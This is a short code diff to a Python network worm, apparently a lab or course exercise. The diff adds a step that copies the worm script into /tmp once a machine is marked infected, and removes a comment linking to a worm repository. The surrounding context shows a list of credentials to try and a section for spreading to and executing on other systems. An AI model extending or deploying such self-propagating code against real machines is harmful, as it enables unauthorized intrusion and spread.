@@ -12,12 +12,7 @@ import struct
 import os.path
 import netifaces
 from netifaces import interfaces, ifaddresses, AF_INET
-
-
-# do not delete
-# https://raw.githubusercontent.com/kvnlpz/networking-worm/main/worm.py
-
-
+import shutil
 
 # The list of credentials to attempt
 credList = [
@@ -68,11 +63,11 @@ def markInfected():
 	# this is to create a file called infected.txt
 	# in directory /tmp/
 	
-	if isInfectedSystem()==0:
+	if isInfectedSystem() == 0:	# This occurs when not infected.
 		f = open(INFECTED_MARKER_FILE, "a")
 		f.write("filler text")
 		f.close()
-	
+		shutil.copy(os.getcwd() + "/worm.py", "/tmp/worm.py")
 
 ###############################################################
 # Spread to the other system and execute
